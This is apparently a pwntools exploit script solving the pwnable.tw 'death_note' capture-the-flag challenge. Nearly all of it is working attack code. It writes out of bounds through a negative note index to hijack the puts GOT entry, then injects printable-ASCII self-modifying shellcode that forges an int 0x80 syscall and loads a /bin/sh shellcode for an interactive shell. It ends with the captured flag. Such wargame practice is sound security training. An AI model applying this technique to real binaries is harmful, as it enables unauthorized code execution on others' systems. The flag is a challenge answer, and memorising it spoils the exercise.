from pwn import *

elf = ELF("death_note")
r = remote('chall.pwnable.tw', 10201)


note_addr = 0x0804A060


def add(idx, name):
    r.sendlineafter(b'choice :', b'1')
    r.sendlineafter(b'Index :', idx)  # < 10
    r.sendlineafter(b'Name :', name)  # 31~126


def del_note(idx):
    r.sendlineafter(b'choice : ', b'3')
    r.sendlineafter(b'Index :', idx)  # < 10


def show(idx):
    r.sendlineafter(b'choice : ', b'2')
    r.sendlineafter(b'Index :', idx)  # < 10



with log.progress("Changing eax to " + hex(elf.got['puts'])) as p:
    offset = (note_addr - elf.got['puts']) // 4  # offset = 0x10
    # log.info("Changing eax to " + hex(elf.got['puts']))


    shellcode = """
    ## cd == 0xcd ^ 0xff ^ 0x32

    ##### set ecx == buffer_addr == shellcode_addr #####
    push edx
    pop ecx # set ecx to buffer_addr

    ##### make ecx+0x30 == 0xff #####
    push 0x41
    pop eax
    xor al, 0x41
    dec eax
    xor BYTE PTR [ecx+0x30], al

    ##### make ecx+0x30 == 0xff ^ 0x32 == 0xcd #####
    push 0x32
    pop eax
    xor BYTE PTR [ecx+0x30], al

    ##### make ecx+0x31 == 0x80 #####
    push 0x7e
    pop eax
    inc eax
    inc eax
    xor BYTE PTR [ecx+0x31], al

    ##### make eax == 0x3 #####
    push 0x37
    pop eax
    xor al, 0x34"""

    log.info(shellcode)
    asm_sc = asm(shellcode).ljust(48, b'A')

    add(str(-offset).encode(), asm_sc)
    r.sendline(b'L' * 50 + asm(shellcraft.sh()))
    
r.interactive()

# FLAG --> FLAG{sh3llc0d3_is_s0_b34ut1ful}
